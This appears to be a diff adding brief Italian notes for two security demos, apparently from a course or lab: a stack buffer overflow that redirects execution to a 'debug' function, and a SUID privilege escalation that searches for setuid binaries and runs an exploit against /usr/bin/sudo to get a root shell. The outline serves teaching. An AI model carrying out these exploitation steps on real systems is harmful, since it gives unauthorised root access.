@@ -1,0 +1,19 @@
+
+PRIMA DEMO 
+
+"dmesg | tail -n 2" --> guardare i byte traboccati
+sudo sed -i 's/3/2/' /etc/NetworkManager/conf.d/* --> se non funziona il comando di s.f.
+print("A*64) --> COMANDO python3
+a queste A concateno una strigna per a che punto della stringa avviene la sovrascrittura nello stack.
+bytes.fromhex ("contenuto")--> capiamo dove ha iniziato a sovrascrivere
+objdump -d ./hacked | less --> cercare l'indirizzo della funzione debug a cui saltare
+lo concateniamo alla stringa in modo da scrivere nello stack il nostro indirizzo.
+(python3 ./exploit.py;cat ) | ./hacked passare le stringhe fatte con python al server
+
+SECONDA DEMO 
+
+find / -perm -4000 2>/dev/null cerco le directory su cui fare l'attacco 
+./exploit-2 /usr/bin/sudo uso una delle directory trovate per droppare una shell passandola al programma.
+
+per fare le verifiche uso id cosi da vedere con che utente ho accesso a quella shell 
+
